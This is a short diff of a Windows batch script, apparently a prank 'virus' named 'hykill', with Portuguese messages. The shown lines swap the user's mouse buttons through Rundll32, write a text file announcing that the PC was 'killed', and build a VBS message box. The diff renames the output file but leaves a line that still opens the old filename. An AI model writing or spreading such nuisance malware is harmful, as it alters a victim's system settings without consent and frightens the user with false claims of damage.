@@ -4,7 +4,7 @@ pause
 echo Aviso final vc quer mesmo fazer seu pc ficar inutilizavel
 pause
 Rundll32 user32 , SwapMouseButton
-echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > HYKILL.txt
 Start hahahahahahahahahahahah.txt
 echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
 echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
